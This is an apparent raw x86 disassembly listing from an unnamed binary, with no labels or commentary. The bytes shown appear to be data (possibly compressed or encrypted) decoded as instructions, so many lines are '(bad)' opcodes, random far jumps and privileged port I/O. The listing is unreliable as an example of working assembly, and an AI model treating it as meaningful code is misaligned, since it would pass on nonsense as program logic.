  42be00:	aad    0x40
  42be02:	ins    DWORD PTR es:[edi],dx
  42be03:	out    dx,eax
  42be04:	cmp    DWORD PTR [edx-0xf],ebp
  42be07:	fdivr  DWORD PTR [edx-0x6f9d0569]
  42be0d:	add    esi,esp
  42be0f:	stos   BYTE PTR es:[edi],al
  42be10:	fs push ebp
  42be12:	dec    ebx
  42be13:	aaa    
  42be14:	in     al,dx
  42be15:	mov    ebx,?
  42be17:	dec    eax
  42be18:	sub    ch,BYTE PTR [edx-0x6e]
  42be1b:	jbe    0x42be33
  42be1d:	imul   esp,DWORD PTR [eax+0x35],0xd
  42be21:	and    eax,0xf19f34d0
  42be26:	call   0xefd4:0x658a1516
  42be2d:	dec    eax
  42be2e:	retf   0xfb72
  42be31:	xor    ch,BYTE PTR [ebx]
  42be33:	or     BYTE PTR [eax-0x1869488e],bl
  42be39:	sub    BYTE PTR [eax],cl
  42be3b:	fwait
  42be3c:	cs push 0xffffff97
  42be3f:	add    eax,edx
  42be41:	jecxz  0x42be19
  42be43:	xchg   ecx,eax
  42be44:	ins    DWORD PTR es:[edi],dx
  42be45:	sub    esp,DWORD PTR [ebx-0x2e8fbc10]
  42be4b:	jns    0x42be67
  42be4d:	cdq    
  42be4e:	div    BYTE PTR [edx+0x63]
  42be51:	push   0xfd499850
  42be56:	fistp  QWORD PTR [edi-0x327bfef6]
  42be5c:	fcom   DWORD PTR [ecx+ebx*4-0xa519283]
  42be63:	fstp   DWORD PTR [eax+0x59f9071c]
  42be69:	sub    eax,0x4fa1bac9
  42be6e:	aaa    
  42be6f:	or     DWORD PTR [eax+ebx*4],ebp
  42be72:	push   edi
  42be73:	cmp    BYTE PTR [ebx],ch
  42be75:	test   BYTE PTR [edx],0x81
  42be78:	imul   esi,DWORD PTR ds:0x14bf734,0x3b
  42be7f:	add    eax,0x7659749e
  42be84:	mov    bh,0xbb
  42be86:	sub    dl,BYTE PTR [ecx-0x44]
  42be89:	lahf   
  42be8a:	mov    dl,0x7f
  42be8c:	mov    ebp,0x435f2b28
  42be91:	mov    ah,0x77
  42be93:	mov    ds:0x37f8db3f,al
  42be98:	js     0x42be8a
  42be9a:	or     al,BYTE PTR [ebx+edx*2]
  42be9d:	leave  
  42be9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be9f:	mov    ebp,DWORD PTR [ecx]
  42bea1:	jne    0x42be36
  42bea3:	sub    DWORD PTR [ebp-0x2de51955],esi
  42bea9:	jbe    0x42bead
  42beab:	pop    edi
  42beac:	shl    esi,1
  42beae:	cmp    BYTE PTR [esi-0x46e83973],ah
  42beb4:	nop
  42beb5:	or     ah,bh
  42beb7:	jmp    0xe72e6f72
  42bebc:	jg     0x42be4b
  42bebe:	dec    edx
  42bebf:	adc    DWORD PTR [esi+0x0],edi
	...
  42bf32:	add    BYTE PTR [eax],al
  42bf34:	stc    
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	mov    dl,0xb
  42bf42:	jne    0x42bf2b
  42bf44:	cli    
  42bf45:	rol    BYTE PTR [ecx],1
  42bf47:	add    ch,dh
  42bf49:	add    BYTE PTR [eax],al
  42bf4b:	add    BYTE PTR [ecx-0x3a],cl
  42bf4e:	jns    0x42bf96
  42bf50:	imul   esp,DWORD PTR [ebx-0x4deef840],0x35
  42bf57:	or     BYTE PTR [ebp-0x2a],cl
  42bf5a:	stos   DWORD PTR es:[edi],eax
  42bf5b:	lods   al,BYTE PTR ds:[esi]
  42bf5c:	mov    esp,0xb35e1706
  42bf61:	arpl   WORD PTR [ecx+0x51],dx
  42bf64:	daa    
  42bf65:	(bad)  
  42bf66:	cmp    eax,0xbaaebfdb
  42bf6b:	inc    ebx
  42bf6c:	dec    ecx
  42bf6d:	xor    eax,0x1ed7343d
  42bf72:	ret    
  42bf73:	fwait
  42bf74:	(bad)  
  42bf75:	jg     0x42bf6b
  42bf77:	xor    esp,0xf94d5e9f
  42bf7d:	call   0x18bd:0x902df3db
  42bf84:	fidiv  DWORD PTR [ebp+ebx*4+0xa06eaad]
  42bf8b:	(bad)  
  42bf8c:	jae    0x42bf99
  42bf8e:	fist   WORD PTR [ebx-0x154afb75]
  42bf94:	cmp    eax,0xbb7753e
  42bf99:	out    0xf1,eax
  42bf9b:	loopne 0x42bfcb
  42bf9d:	cmp    eax,0x6938000f
  42bfa2:	lods   al,BYTE PTR ds:[esi]
  42bfa3:	and    al,0x35
  42bfa5:	dec    edi
  42bfa6:	call   0x4b04:0xc8e7a41c
  42bfad:	scas   eax,DWORD PTR es:[edi]
  42bfae:	retf   
  42bfaf:	or     eax,0x680727e2
  42bfb4:	push   esp
  42bfb5:	sahf   
  42bfb6:	(bad)  
  42bfb7:	cmp    dh,BYTE PTR [esi+esi*2]
  42bfba:	test   al,0x36
  42bfbc:	jmp    FWORD PTR [edi+eax*1]
  42bfbf:	fwait
  42bfc0:	iret   
  42bfc1:	ins    DWORD PTR es:[edi],dx
  42bfc2:	push   ss
  42bfc3:	mov    ebp,0x8223db1a
  42bfc8:	dec    edx
  42bfc9:	mov    al,0xa
  42bfcb:	in     al,dx
  42bfcc:	push   edx
  42bfcd:	adc    dh,BYTE PTR [edi+0x46fb0305]
  42bfd3:	loop   0x42bf5c
  42bfd5:	xchg   ecx,eax
  42bfd6:	mov    edi,0x57d3fc87
  42bfdb:	mov    esp,0x186c2db7
  42bfe0:	push   cs
  42bfe1:	repz mov ch,0x3a
  42bfe4:	jnp    0x42bfb6
  42bfe6:	pop    ds
  42bfe7:	jl     0x42bf8a
  42bfe9:	mov    al,0x83
  42bfeb:	daa    
  42bfec:	xchg   ebx,eax
  42bfed:	test   cl,dl
  42bfef:	out    0x64,al
  42bff1:	loopne 0x42bfc5
  42bff3:	mov    esp,0x74110441
  42bff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bff9:	add    ah,bl
  42bffb:	stos   DWORD PTR es:[edi],eax
  42bffc:	pop    ecx
  42bffd:	fs or  al,0x31
  42c000:	div    BYTE PTR [eax+0x54c8b7a0]
  42c006:	adc    eax,DWORD PTR [eax+0x21aaeccb]
  42c00c:	jnp    0x42c052
  42c00e:	dec    esi
  42c00f:	pusha  
  42c010:	bound  esi,QWORD PTR [ebp+eax*8-0x130bf0f2]
  42c017:	(bad)  
  42c018:	iret   
  42c019:	push   ds
  42c01a:	jb     0x42bfd2
  42c01c:	loope  0x42c058
  42c01e:	fstp   DWORD PTR [edx-0x35]
  42c021:	not    DWORD PTR [edi+0x3e87defb]
  42c027:	imul   edi,ecx,0x613a042b
  42c02d:	cli    
  42c02e:	pusha  
  42c02f:	or     eax,0x37a70366
  42c034:	push   cs
  42c035:	mov    BYTE PTR [eax],bl
  42c037:	adc    eax,0x6a7ff77
  42c03c:	sbb    bh,BYTE PTR [eax]
  42c03e:	sbb    DWORD PTR [edi+0x79],0x0
	...
  42c0b4:	jne    0x42c0db
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0xac942915
  42c0c1:	retf   
  42c0c2:	add    DWORD PTR [ecx-0x11],esp
  42c0c5:	rol    DWORD PTR [ecx],1
  42c0c7:	add    ch,dh
  42c0c9:	add    BYTE PTR [eax],al
  42c0cb:	add    dh,ah
  42c0cd:	push   esi
  42c0ce:	inc    ebp
  42c0cf:	fcom   DWORD PTR [edi]
  42c0d1:	in     al,0xfa
  42c0d3:	cmp    edx,eax
  42c0d5:	xchg   edi,eax
  42c0d6:	das    
  42c0d7:	inc    edx
  42c0d8:	push   ss
  42c0d9:	ja     0x42c0a9
  42c0db:	sbb    DWORD PTR [ebx-0x5e],ecx
  42c0de:	xlat   BYTE PTR ds:[ebx]
  42c0df:	sub    ah,bl
  42c0e1:	call   0xd84b:0xd53bfaa0
  42c0e8:	int3   
  42c0e9:	bound  ebp,QWORD PTR [edi-0x61]
  42c0ec:	das    
  42c0ed:	pop    ds
  42c0ee:	push   ss
  42c0ef:	in     eax,0x34
  42c0f1:	mov    bl,BYTE PTR [ebx+0xe3f6276]
  42c0f7:	call   0xedcc:0x801b7b06
  42c0fe:	add    ecx,DWORD PTR [esi]
  42c100:	stos   BYTE PTR es:[edi],al
  42c101:	pop    eax
  42c102:	xchg   edx,eax
  42c103:	mov    ecx,0xb0a86791
  42c108:	outs   dx,DWORD PTR ds:[esi]
  42c109:	jge    0x42c16e
  42c10b:	ja     0x42c095
  42c10d:	push   cs
  42c10e:	cs in  al,0xff
  42c111:	es aad 0x59
  42c114:	add    al,0xc4
  42c116:	sbb    ebp,esi
  42c118:	jecxz  0x42c178
  42c11a:	push   ss
  42c11b:	lahf   
  42c11c:	dec    eax
  42c11d:	scas   al,BYTE PTR es:[edi]
  42c11e:	imul   eax,DWORD PTR [eax+edx*8-0x42],0x17084826
  42c126:	fsubr  QWORD PTR [eax-0x5e1a9817]
  42c12c:	hlt    
  42c12d:	sub    eax,DWORD PTR ds:[ecx]
  42c130:	fdiv   st,st(5)
  42c132:	or     bl,dh
  42c134:	mov    DWORD PTR [edx],0xaeb7c876
  42c13a:	mov    DWORD PTR [ebp+0x4069c82e],esp
  42c140:	lds    eax,FWORD PTR [ecx]
  42c142:	mov    cl,0x99
  42c144:	or     cl,cl
  42c146:	jl     0x42c158
  42c148:	sbb    al,ah
  42c14a:	scas   al,BYTE PTR es:[edi]
  42c14b:	in     eax,0x9d
  42c14d:	xchg   ebx,eax
  42c14e:	inc    edi
  42c14f:	sbb    BYTE PTR [eax+0x447f1146],cl
  42c155:	xor    DWORD PTR [edx-0x5a8ee802],esi
  42c15b:	lods   eax,DWORD PTR ds:[esi]
  42c15c:	adc    BYTE PTR [edi+0xf57b95b],0xd4
  42c163:	out    0x26,al
  42c165:	pop    DWORD PTR [ebx+0x61]
  42c168:	or     esi,esi
  42c16a:	test   al,0x63
  42c16c:	das    
  42c16d:	loope  0x42c0f9
  42c16f:	test   al,0x36
  42c171:	xchg   ecx,eax
  42c172:	push   eax
  42c173:	push   ecx
  42c174:	and    BYTE PTR [edx],dl
  42c176:	jmp    0x42c17d
  42c178:	mov    ebx,0x5bacd60d
  42c17d:	(bad)  
  42c17e:	cmc    
  42c17f:	lock adc al,0x67
  42c182:	mov    al,0x92
  42c184:	mov    eax,ds:0x8f21796d
  42c189:	out    dx,eax
  42c18a:	sbb    bl,BYTE PTR [edx]
  42c18c:	sbb    al,0x6d
  42c18e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c18f:	fmul   QWORD PTR [esi+0x0]
  42c192:	or     DWORD PTR [ebx+0x2ce6fa2b],edi
  42c198:	adc    BYTE PTR [ebx],al
  42c19a:	mov    ah,0x40
  42c19c:	pop    ebp
  42c19d:	lock add eax,0xfa48c4ef
  42c1a3:	imul   esi,DWORD PTR [ebp-0x54],0x47
  42c1a7:	jmp    0xb3bd432d
  42c1ac:	adc    BYTE PTR [ecx+eiz*2-0x19],cl
  42c1b0:	(bad)  
  42c1b1:	repnz pop es
  42c1b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c1b4:	shl    BYTE PTR [eax+0x65b99aa5],0xbb
  42c1bb:	sbb    DWORD PTR [ebx+0x39d5ddca],edx
	...
  42c231:	add    BYTE PTR [eax],al
  42c233:	add    BYTE PTR [ebp-0x449f6672],ah
  42c239:	ja     0x42c238
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1+0x1c]
  42c241:	mov    dh,0xba
  42c243:	or     ah,ah
  42c245:	rol    BYTE PTR [ecx],cl
  42c247:	add    ch,dh
  42c249:	add    BYTE PTR [eax],al
  42c24b:	add    BYTE PTR [ecx],al
  42c24d:	je     0x42c2ac
  42c24f:	jmp    0x3fa472c4
  42c254:	loope  0x42c2ae
  42c256:	outs   dx,BYTE PTR ds:[esi]
  42c257:	cdq    
  42c258:	sub    al,dh
  42c25a:	mul    ecx
  42c25c:	sub    al,BYTE PTR [eax+0x79d28fa6]
  42c262:	mov    ss,WORD PTR [edi]
  42c264:	(bad)  
  42c265:	enter  0x7147,0x8a
  42c269:	adc    DWORD PTR ds:0x7a300984,0x7bb73281
  42c273:	in     al,0x99
  42c275:	jg     0x42c215
  42c277:	icebp  
  42c278:	fbld   TBYTE PTR [ecx-0x21]
  42c27b:	push   ebx
  42c27c:	mov    dl,0x59
  42c27e:	ret    0xf6f5
  42c281:	fbstp  TBYTE PTR [edx+ebp*8+0x7a0355d0]
  42c288:	mov    esi,0xc24449a4
  42c28d:	es push ebp
  42c28f:	sbb    al,0x35
  42c291:	xchg   BYTE PTR [ebx],ah
  42c293:	dec    edx
  42c294:	iret   
  42c295:	sbb    eax,0xdb06ab36
  42c29a:	mov    ah,0xf7
  42c29c:	inc    eax
  42c29d:	jmp    0x42c245
  42c29f:	stos   DWORD PTR es:[edi],eax
  42c2a0:	js     0x42c28a
  42c2a2:	add    eax,0x8e6948f3
  42c2a7:	mov    ebp,0xf5d2b7ea
  42c2ac:	adc    dl,BYTE PTR [ebx-0x6f]
  42c2af:	inc    ebx
  42c2b0:	not    al
  42c2b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c2b3:	mov    eax,DWORD PTR [esp+ecx*1]
  42c2b6:	repnz adc eax,DWORD PTR [eax]
  42c2b9:	ja     0x42c320
  42c2bb:	pop    esi
  42c2bc:	retf   
  42c2bd:	mov    ah,cl
  42c2bf:	test   al,0x6b
  42c2c1:	mov    ds:0x6942241a,eax
  42c2c6:	mov    al,ds:0xba2062ef
  42c2cb:	pop    ds
  42c2cc:	(bad)  
  42c2cd:	push   eax
  42c2ce:	das    
  42c2cf:	jmp    0x42c2df
  42c2d1:	xor    al,0xe6
  42c2d3:	or     DWORD PTR [esi-0x6b],esi
  42c2d6:	popa   
  42c2d7:	shl    BYTE PTR [bx-0x303a],1
  42c2dc:	inc    esi
  42c2dd:	or     BYTE PTR [ecx-0x283cdbd1],0xb9
  42c2e4:	test   al,0x54
  42c2e6:	adc    eax,0x6630aedb
  42c2eb:	mov    bl,0x88
  42c2ed:	jl     0x42c333
  42c2ef:	inc    esp
  42c2f0:	dec    ecx
  42c2f1:	jmp    0xf356:0xa5f446e7
  42c2f8:	inc    eax
  42c2f9:	sub    al,BYTE PTR [eax]
  42c2fb:	iret   
  42c2fc:	cwde   
  42c2fd:	outs   dx,DWORD PTR ds:[esi]
  42c2fe:	bound  ebx,QWORD PTR [ebx+0x5c42259a]
  42c304:	push   es
  42c305:	test   DWORD PTR [ebp-0x6d],ebx
  42c308:	pop    esp
  42c309:	pusha  
  42c30a:	hlt    
  42c30b:	ds push ds
  42c30d:	daa    
  42c30e:	xchg   esp,eax
  42c30f:	jl     0x42c2e0
  42c311:	not    DWORD PTR [eax]
  42c313:	adc    cl,BYTE PTR [edx]
  42c315:	pop    edx
  42c316:	jmp    0xc2eb:0x56e05cd7
  42c31d:	dec    DWORD PTR [esi+0x6884e2f3]
  42c323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c324:	and    DWORD PTR ds:0xf31d792c,eax
  42c32a:	in     eax,0xbe
  42c32c:	les    ecx,FWORD PTR ds:0xbfd25011
  42c332:	dec    edx
  42c333:	mov    edi,0x6007ccf9
  42c338:	loop   0x42c361
  42c33a:	ror    BYTE PTR [eax-0x552e5792],0x87
	...
  42c3b1:	add    BYTE PTR [eax],al
  42c3b3:	add    BYTE PTR [edx-0x1011dfbb],cl
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx+0x67]
  42c3c1:	xor    DWORD PTR [esi+0x1d3d9d9],edi
  42c3c7:	add    ch,dh
  42c3c9:	add    BYTE PTR [eax],al
  42c3cb:	add    BYTE PTR [ecx],bl
  42c3cd:	es xchg ebp,eax
  42c3cf:	aad    0x45
  42c3d1:	jecxz  0x42c42b
  42c3d3:	ror    DWORD PTR [edi],0x84
  42c3d6:	jb     0x42c43a
  42c3d8:	out    dx,eax
  42c3d9:	mov    ecx,0x250e7374
  42c3de:	push   esp
  42c3df:	nop
  42c3e0:	cmp    DWORD PTR [ebx],edx
  42c3e2:	into   
  42c3e3:	and    cl,dl
  42c3e5:	mov    al,ds:0x2fc27fa9
  42c3ea:	xchg   DWORD PTR [esi],ecx
  42c3ec:	mov    ch,0x25
  42c3ee:	mov    ebp,0x97c4762f
  42c3f3:	mov    eax,ds:0x6f92160c
  42c3f8:	sub    al,0xaf
  42c3fa:	jecxz  0x42c422
  42c3fc:	fisub  DWORD PTR [esi+0x67]
  42c3ff:	test   bh,dh
  42c401:	int3   
  42c402:	mov    esp,0xb52a3f3e
  42c407:	push   edx
  42c408:	in     eax,dx
  42c409:	addr16 pinsrw mm2,ecx,0xad
  42c40e:	int    0xd4
  42c410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c411:	mov    cl,0xe0
  42c413:	dec    esi
  42c414:	into   
  42c415:	mov    ebp,0x8c469cde
  42c41a:	bound  eax,QWORD PTR [edi]
  42c41c:	scas   eax,DWORD PTR es:[edi]
  42c41d:	sbb    al,0x7b
  42c420:	outs   dx,DWORD PTR ds:[esi]
  42c421:	and    ecx,DWORD PTR [ebp+0x737cae3f]
  42c427:	inc    edx
  42c428:	fld    QWORD PTR [ecx-0x53]
  42c42b:	(bad)  
  42c42c:	popa   
  42c42d:	add    dl,BYTE PTR [ebp-0x49]
  42c430:	and    ecx,eax
  42c432:	xor    al,0xdc
  42c434:	cmp    eax,0x693240ff
  42c439:	retf   0xcca8
  42c43c:	fcmovu st,st(7)
  42c43e:	ja     0x42c3fb
  42c440:	pop    es
  42c441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c442:	shr    DWORD PTR [ecx],cl
  42c444:	xlat   BYTE PTR ds:[ebx]
  42c445:	arpl   dx,si
  42c447:	mov    bl,0x79
  42c449:	push   ss
  42c44a:	sbb    DWORD PTR ds:0x9d2d69fa,ebx
  42c450:	dec    edx
  42c451:	mov    bl,0x9b
  42c453:	call   0xe22e6b05
  42c458:	mov    dh,0x9
  42c45a:	and    bh,BYTE PTR [eax-0x3b]
  42c45d:	push   0xffffffb0
  42c45f:	push   ds
  42c460:	inc    eax
  42c461:	add    DWORD PTR [ecx-0x3],eax
  42c464:	not    BYTE PTR [eiz*4-0x68dfb1b3]
  42c46b:	fs mov ch,0x9b
  42c46e:	ins    DWORD PTR es:[edi],dx
  42c46f:	mov    bl,0x78
  42c471:	xorps  xmm4,XMMWORD PTR [esi+ebp*8-0x7bcd8c09]
  42c479:	aad    0x33
  42c47b:	xor    bl,BYTE PTR [ebp+0x72]
  42c47e:	and    eax,0xf2cf324a
  42c483:	jo     0x42c4f9
  42c485:	ret    0x8197
  42c488:	clc    
  42c489:	xchg   ebx,eax
  42c48a:	push   0xdb553ae3
  42c48f:	icebp  
  42c490:	les    esp,FWORD PTR [esi+0x6d]
  42c493:	in     al,0x95
  42c495:	mov    ebx,0xd4101ea8
  42c49a:	cld    
  42c49b:	dec    ebp
  42c49c:	mov    ch,0xcd
  42c49e:	cmp    BYTE PTR [ecx-0x25],al
  42c4a1:	je     0x42c491
  42c4a3:	mov    ch,0x61
  42c4a5:	repnz sub DWORD PTR cs:[edi-0x2f],esp
  42c4aa:	or     edx,DWORD PTR [eax+edi*2-0x30]
  42c4ae:	dec    edx
  42c4af:	shl    DWORD PTR [ebp+0x61ea2187],cl
  42c4b5:	idiv   DWORD PTR [edx]
  42c4b7:	fstp   QWORD PTR [ecx]
  42c4b9:	loope  0x42c529
  42c4bb:	ror    ecx,0x41
  42c4be:	fistp  DWORD PTR [ebx-0x12]
	...
  42c531:	add    BYTE PTR [eax],al
  42c533:	add    al,ah
  42c535:	xchg   esp,eax
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	aas    
  42c541:	test   al,0xeb
  42c543:	xor    dh,cl
  42c545:	aam    0x1
  42c547:	add    ch,dh
  42c549:	add    BYTE PTR [eax],al
  42c54b:	add    BYTE PTR [edx],al
  42c54d:	sub    cl,BYTE PTR [esi+0x5a]
  42c550:	and    BYTE PTR [eax+0x11],bh
  42c553:	cmp    esi,DWORD PTR [ecx+0x5a]
  42c556:	pop    eax
  42c557:	cmp    edi,DWORD PTR [edx+0x145a099a]
  42c55d:	cmc    
  42c55e:	enter  0x95e0,0xce
  42c562:	and    ah,BYTE PTR [ecx+esi*8]
  42c565:	jns    0x42c5a9
  42c567:	out    0x4b,al
  42c569:	and    al,0x5d
  42c56b:	mov    dh,0x5a
  42c56d:	mov    edx,0x218262ea
  42c573:	cmp    dl,bl
  42c575:	daa    
  42c576:	mov    eax,0xe9faead1
  42c57b:	adc    ah,ch
  42c57d:	dec    eax
  42c57e:	mov    BYTE PTR [edi],bl
  42c580:	adc    DWORD PTR [edx],esp
  42c582:	mov    ecx,ebx
  42c584:	pushf  
  42c585:	ja     0x42c5eb
  42c587:	and    edi,DWORD PTR [eax-0x1e8e0538]
  42c58d:	jbe    0x42c51e
  42c58f:	test   esp,ebx
  42c591:	int3   
  42c592:	test   eax,0xcfc15e85
  42c597:	bound  esp,QWORD PTR [eax]
  42c599:	mov    edi,0x98f5fa9f
  42c59e:	cmp    esp,DWORD PTR [ebx+0x4a540267]
  42c5a4:	repz mov ds:0xe61baba8,al
  42c5aa:	mov    al,dh
  42c5ac:	in     eax,0x85
  42c5ae:	pop    ecx
  42c5af:	sub    ecx,DWORD PTR [ebp-0x30]
  42c5b2:	pop    ds
  42c5b3:	adc    esi,DWORD PTR [ebx+esi*8-0x80]
  42c5b7:	cmc    
  42c5b8:	add    BYTE PTR [eax+0xb7c8764],0x7b
  42c5bf:	mov    ch,0x66
  42c5c1:	dec    edi
  42c5c2:	pop    ecx
  42c5c3:	push   es
  42c5c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5c5:	dec    ebx
  42c5c6:	pop    es
  42c5c7:	(bad)  
  42c5c8:	fisttp QWORD PTR [ebx]
  42c5ca:	(bad)  
  42c5cb:	or     al,0x53
  42c5cd:	lea    edx,[ecx+0x2b77df5a]
  42c5d3:	loope  0x42c595
  42c5d5:	loop   0x42c585
  42c5d7:	xor    DWORD PTR [edx],esp
  42c5d9:	inc    ecx
  42c5da:	adc    ebx,ecx
  42c5dc:	mov    ecx,0x6b754a5c
  42c5e1:	test   al,0x17
  42c5e3:	inc    esp
  42c5e4:	iret   
  42c5e5:	xchg   esi,eax
  42c5e6:	jg     0x42c5f5
  42c5e8:	fidivr DWORD PTR [ebx]
  42c5ea:	shl    DWORD PTR [eax+eax*4],cl
  42c5ed:	dec    ecx
  42c5ef:	mov    ds:0xd408dc9b,eax
  42c5f4:	sub    edi,eax
  42c5f6:	nop
  42c5f7:	sti    
  42c5f8:	lock daa 
  42c5fa:	mov    ds:0x40974bb9,eax
  42c5ff:	sbb    eax,0xeede767f
  42c604:	stos   BYTE PTR es:[edi],al
  42c605:	pop    edi
  42c606:	arpl   WORD PTR [ecx+edi*2+0x399ba7eb],cx
  42c60d:	sbb    esi,esi
  42c60f:	pusha  
  42c610:	mov    al,0xd3
  42c612:	icebp  
  42c613:	dec    eax
  42c614:	adc    cl,BYTE PTR [ecx]
  42c616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c617:	add    dl,BYTE PTR [edi]
  42c619:	jne    0x42c5c8
  42c61b:	adc    BYTE PTR [eax+0x43bafaef],bh
  42c621:	and    ebp,ecx
  42c623:	sar    BYTE PTR [esi+0x4e],0xd8
  42c627:	mov    dh,0x1
  42c629:	cmp    ebp,edi
  42c62b:	sub    al,0x31
  42c62d:	xchg   edx,eax
  42c62e:	loope  0x42c5e7
  42c630:	cmp    BYTE PTR [edi-0xb59ba2a],cl
  42c636:	mov    di,WORD PTR ds:0xf266b30
  42c63d:	(bad)  
  42c63e:	sbb    dh,BYTE PTR [ecx]
  42c640:	in     al,dx
	...
  42c6b1:	add    BYTE PTR [eax],al
  42c6b3:	add    BYTE PTR [esi+0x42],cl
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0x80be,0xf8
  42c6c2:	mov    edx,cs
  42c6c4:	ret    
  42c6c5:	aad    0x1
  42c6c7:	add    ch,dh
  42c6c9:	add    BYTE PTR [eax],al
  42c6cb:	add    BYTE PTR [esi-0x737260fb],dl
  42c6d1:	add    BYTE PTR [ebp+0x25],bh
  42c6d4:	dec    ecx
  42c6d5:	dec    esi
  42c6d6:	xchg   DWORD PTR [esi],edx
  42c6d8:	or     cl,al
  42c6da:	sahf   
  42c6db:	gs int 0x9c
  42c6de:	dec    ebx
  42c6df:	clc    
  42c6e0:	pop    esp
  42c6e1:	scas   al,BYTE PTR es:[edi]
  42c6e2:	and    ch,cl
  42c6e4:	cwde   
  42c6e5:	in     eax,dx
  42c6e6:	stc    
  42c6e7:	ins    DWORD PTR es:[edi],dx
  42c6e8:	push   edx
  42c6e9:	out    dx,eax
  42c6ea:	daa    
  42c6eb:	mov    edi,0x93b272db
  42c6f0:	add    bh,BYTE PTR [ecx-0x10]
  42c6f3:	mov    ebp,?
  42c6f5:	inc    ecx
  42c6f6:	inc    edx
  42c6f7:	xchg   esi,eax
  42c6f8:	icebp  
  42c6f9:	sbb    eax,0x2a27e04
  42c6fe:	cs dec edi
  42c700:	mov    DWORD PTR [ebp-0x6255c4c],esp
  42c706:	fcmovbe st,st(5)
  42c708:	je     0x42c6d7
  42c70a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c70b:	dec    esp
  42c70c:	jl     0x42c70e
  42c70e:	cdq    
  42c70f:	mov    ebp,0x2196fe05
  42c714:	or     esi,ebp
  42c716:	stc    
  42c717:	add    DWORD PTR [edx],esp
  42c719:	push   edi
  42c71a:	mov    ds:0x9db322b8,al
  42c71f:	jns    0x42c6d2
  42c721:	sbb    esi,DWORD PTR [ebx-0x54]
  42c724:	mov    ds:0xeda0ca27,al
  42c729:	in     eax,dx
  42c72a:	inc    edx
  42c72b:	dec    edi
  42c72c:	sbb    esp,ecx
  42c72e:	(bad)  
  42c72f:	cmp    BYTE PTR [esi-0x6d77522c],bh
  42c735:	sub    DWORD PTR [edx],0xffffffe6
  42c738:	dec    esi
  42c739:	or     BYTE PTR [edi-0x7bc5d8d1],bh
  42c73f:	in     eax,0xb7
  42c741:	add    eax,0x3692cebd
  42c746:	outs   dx,DWORD PTR ds:[esi]
  42c747:	repnz scas eax,DWORD PTR es:[edi]
  42c749:	add    BYTE PTR [edi],dh
  42c74b:	cld    
  42c74c:	inc    edi
  42c74d:	loopne 0x42c7b2
  42c74f:	ds loopne 0x42c7ae
  42c752:	cli    
  42c753:	cvtps2pi mm7,QWORD PTR [edx]
  42c756:	(bad)  
  42c757:	cmp    al,0x71
  42c759:	popa   
  42c75a:	add    ch,BYTE PTR [ebp+0x1b0e1e80]
  42c760:	xchg   dl,cl
  42c762:	xchg   ebx,eax
  42c763:	adc    al,0x87
  42c765:	test   al,cl
  42c767:	fsubp  st(3),st
  42c769:	test   eax,0x93ce4205
  42c76e:	dec    ecx
  42c76f:	or     ecx,DWORD PTR [edx+0x7b]
  42c772:	xchg   ecx,eax
  42c773:	test   BYTE PTR [ecx],dh
  42c775:	stos   DWORD PTR es:[edi],eax
  42c776:	dec    eax
  42c777:	imul   eax,DWORD PTR [esi-0x4e],0x4f
  42c77b:	pop    ebx
  42c77c:	(bad)  
  42c77d:	imul   esp,DWORD PTR [esi],0x17342424
  42c783:	fild   QWORD PTR [ecx-0x1f]
  42c786:	mov    ecx,0x4c55c380
  42c78b:	repnz stos DWORD PTR es:[edi],eax
  42c78d:	mov    eax,eax
  42c78f:	mov    dl,0xfe
  42c791:	mov    ebp,0x44def8b0
  42c796:	mov    ecx,ebx
  42c798:	pushf  
  42c799:	sar    DWORD PTR [edx+0x27],1
  42c79c:	mov    ebx,0x43ca835e
  42c7a1:	mov    al,ds:0xf72ce715
  42c7a6:	(bad)  
  42c7a7:	or     edx,DWORD PTR [eax]
  42c7a9:	xor    DWORD PTR [esi-0x67f6d665],esi
  42c7af:	ror    DWORD PTR [esi-0x13],0xd0
  42c7b3:	int3   
  42c7b4:	pop    es
  42c7b5:	mov    ds:0x98fd6804,eax
  42c7ba:	pop    ebp
  42c7bb:	je     0x42c74f
  42c7bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c7be:	mov    dl,0xa9
  42c7c0:	sbb    eax,0x0
	...
  42c831:	add    BYTE PTR [eax],al
  42c833:	add    al,ch
  42c835:	popf   
  42c836:	mov    esi,0xf9e7ffe7
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0xa1548341
  42c844:	mov    eax,0xf50001d6
  42c849:	add    BYTE PTR [eax],al
  42c84b:	add    BYTE PTR [edx-0x5efc541a],cl
  42c851:	pop    edx
  42c852:	mov    dl,0x4b
  42c854:	out    dx,al
  42c855:	gs sub ch,al
  42c858:	add    bh,0x65
  42c85b:	ins    DWORD PTR es:[edi],dx
  42c85c:	push   ecx
  42c85d:	and    al,0x53
  42c85f:	jmp    0x65c9:0xa7322e6a
  42c866:	xchg   BYTE PTR [edi],bh
  42c868:	mov    eax,0x3ca0b99e
  42c86d:	sbb    BYTE PTR [ebx+0x71],0xd4
